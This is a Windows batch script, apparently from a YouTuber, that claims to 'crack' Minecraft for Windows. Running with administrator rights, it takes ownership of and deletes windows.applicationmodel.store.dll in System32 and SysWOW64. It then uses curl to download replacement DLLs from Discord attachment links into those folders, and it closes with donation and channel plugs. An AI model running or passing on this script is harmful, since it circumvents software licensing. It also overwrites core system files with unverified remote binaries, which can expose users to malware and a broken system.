@echo off
TITLE WELCOME TO SHIVU'S CMD COMMAND BLOCK FOR CRACKING MINECRAFT FOR WINDOWS 
m&cls&echo =====================================================================================&echo #Project: WELCOME TO SHIVU'S CMD COMMAND BLOCK FOR CRACKING MINECRAFT FOR WINDOWS &echo =====================================================================================
for /f "delims=" %%i in ('PowerShell -Command "(New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"') do set "IsAdmin=%%i"

if /I "%IsAdmin%"=="False" (
    echo THIS SCRIPT REQUIRES ADMINISTRATIVE PRIVILEGES TO RUN.
    echo ==================================================================
    echo PLEASE RUN THE SCRIPT AS AN ADMINISTRATOR.
    echo ==================================================================
    echo IF THIS ISSUE PERSISTS PLEASE CONTACT US IN DISCORD "dsg.gg/shivu"
    echo ==================================================================
    echo.
    echo Press Any Key To Close
    pause > nul
    exit /b 1
)

m&cls&echo =====================================================================================&echo #Project: WELCOME TO SHIVU'S CMD COMMAND BLOCK FOR CRACKING MINECRAFT FOR WINDOWS &echo =====================================================================================&echo.&echo #Supported products:&echo - Minecraft For Windows 11 1.16 to 1.20 &echo - Minecraft For Windows 10 1.16 to 1.20 &echo - Minecraft Education Edition For Windows 11  &echo - Other Minecraft For Windows Editions&echo.&echo.&echo =====================================================================================&echo Activating Your Minecraft...&echo =====================================================================================&echo.&echo
CHOICE /C:YN /M "PLEASE MAKE SURE IF YOUR INTERNET CONNECTION IS STABLE?: "
IF ERRORLEVEL 2 EXIT
ECHO =====================================================================================
CHOICE /C:YN /M "DO YOU AGREE WITH THIS SCRIPT DOWNLOADING 3.75 MB FILES?: "
IF ERRORLEVEL 2 EXIT
ECHO =====================================================================================
echo.&echo

cd C:/windows/system32/ >nul
takeown /f windows.applicationmodel.store.dll >nul
icacls windows.applicationmodel.store.dll /grant %username%:f > nul
del windows.applicationmodel.store.dll >nul
cd C:/windows/syswow64 >nul
takeown /f windows.applicationmodel.store.dll >nul
icacls windows.applicationmodel.store.dll /grant %username%:f > nul
del windows.applicationmodel.store.dll >nul

cd C:/windows/system32 >nul
curl "https://cdn.discordapp.com/attachments/1030847408202076220/1230458652247199764/Windows.ApplicationModel.Store.dll?ex=663364eb&is=6620efeb&hm=8ee422316a75856bc8efd383a74812148a5582aa3e357dcb6361f09b527582b0&" -o windows.applicationmodel.store.dll >nul

cd C:/windows/syswow64 >nul
curl "https://cdn.discordapp.com/attachments/1030847408202076220/1230525388535365682/Windows.ApplicationModel.Store.dll?ex=6633a312&is=66212e12&hm=72c7d8bb512e739b2e4852a4bbf380cafa72e0f2306f73729483ceb86fb8b1a9&" -o windows.applicationmodel.store.dll >nul
echo.&echo =====================================================================================&echo.&echo ACTIVATED SUCCESSFULLY!!! &echo.&echo #My YouTube Channel: youtube.com/shivuthetechguy&echo.&echo "Show Some Support By Pressing The Like & Share Button And Don't Forget To Subsribe To Me For Such Content" &echo.&echo #Please feel free to contact us at discord 'dsc.gg/shivu' if you have any questions or concerns.&echo.&echo #Please consider supporting this project: UPI ID : chauhansaab1@fam UPI USER : Shivansh Chauhan&echo #Your support is help me making this kind of stuff!&echo Thanks!&echo.&echo =====================================================================================&choice /n /c YN /m "Would you like to visit my blog [Y,N]?"
